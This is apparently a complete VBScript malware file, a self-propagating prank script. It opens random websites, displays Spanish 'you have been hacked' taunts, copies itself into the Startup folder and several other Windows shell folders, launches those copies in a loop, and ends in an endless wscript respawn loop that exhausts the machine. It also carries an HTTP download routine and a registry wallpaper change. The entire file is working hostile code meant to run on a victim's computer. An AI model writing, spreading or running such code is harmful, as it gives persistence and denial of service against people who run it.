randomize timer

'Variables globales 
Const numberOfPages = (3)
Const numberOfMessages = (3)
set objshell = createobject("wscript.shell")


'Arrays
Redim urls(numberOfPages)
urls(0) = "http://google.com"
urls(1) = "http://twitter.com"
urls(2) = "http://instagram.com"

Redim messages(numberOfMessages)
messages(0) = "HAS SIDO HACKEADO :)"
messages(1) = "NO PODRAS ESCAPAR"
messages(2) = "DETRAS DE TI"




'Funciones
sub openGoogle(url)
	'It opens the web page specified in the parameter in the default browser
	objshell.run ("cmd /c start " + url),vbhide
end sub

sub createWindow(mensaje)
	'It creates a window with the message specified in the parameter
	wscript.echo mensaje
end sub

function randomNumber(max)
	'It returns a random number given a maximum where
	numero = int(rnd() * max)
	randomNumber = numero
end function

sub openRandomPage()
	openGoogle urls(randomNumber(numberOfPages))
end sub

sub openRandomWindow()
		createWindow messages(randomNumber(numberOfPages))	
end sub

sub copyToStartUp()
	CreateObject("Shell.Application").Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
end sub

sub infect()
	'5 11 2 6     ---   2 5 6 11
	
	CreateObject("Shell.Application").Namespace(2).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
	CreateObject("Shell.Application").Namespace(5).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
	CreateObject("Shell.Application").Namespace(6).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
	CreateObject("Shell.Application").Namespace(11).CopyHere WScript.ScriptFullName, 4 + 16 + 1024

end sub

Sub HTTPDownload( myURL, myPath )
' This Sub downloads the FILE specified in myURL to the path specified in myPath.
'
' myURL must always end with a file name
' myPath may be a directory or a file name; in either case the directory must exist


    ' Standard housekeeping
    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
    Const ForReading = 1, ForWriting = 2, ForAppending = 8

    ' Create a File System Object
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )

    ' Check if the specified target file or folder exists,
    ' and build the fully qualified path of the target file
    If objFSO.FolderExists( myPath ) Then
        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
        strFile = myPath
    Else
        WScript.Echo "ERROR: Target folder not found."
        Exit Sub
    End If

    ' Create or open the target file
    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )

    ' Create an HTTP object
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )

    ' Download the specified URL
    objHTTP.Open "GET", myURL, False
    objHTTP.Send

    ' Write the downloaded byte stream to the target file
    For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
    Next

    ' Close the target file
    objFile.Close( )
End Sub
 

sub setWallpaper ()
	dim wshShell
	dim sUserName

	Set wshShell = WScript.CreateObject("WScript.Shell")
	sUserName = wshShell.ExpandEnvironmentStrings("%USERNAME%")

	Set oShell = CreateObject("WScript.Shell")
	Set oFSO = CreateObject("Scripting.FileSystemObject")

	sWinDir = oFSO.GetSpecialFolder(0)
	sWallPaper = "C:\HD-wallpaper-anime-the-quintessential-quintuplets-miku-nakano.jpg"

	' update in registry
	oShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", sWallPaper

	' let the system know about the change
	oShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

	msgbox "done" 
end sub

sub executeOne(i)
	dim path
	path = CreateObject("Shell.Application").Namespace(i).Self.Path+"\spammer.vbs"
	path = """" & path & """"
	objshell.run path
end sub

sub executeAll()
	executeOne(2)
	executeOne(5)
	executeOne(6)
	executeOne(7)
	executeOne(11)
	
end sub

'MAIN
sub Main()
	openRandomPage
	openRandomWindow
	for i=0 to 100 step 1   
		copyToStartUp
		infect
		executeAll
	next 
	While True CreateObject("WScript.Shell").Exec("wscript.exe " & Wscript.ScriptName) Wend
end sub

Main


'HTTPDownload http://www.emagcloud.com/europeansealing/FSA_ESA_Compression_Packing_Technical_Manual_v3/pubData/source/images/pages/page10.jpg", "C:\"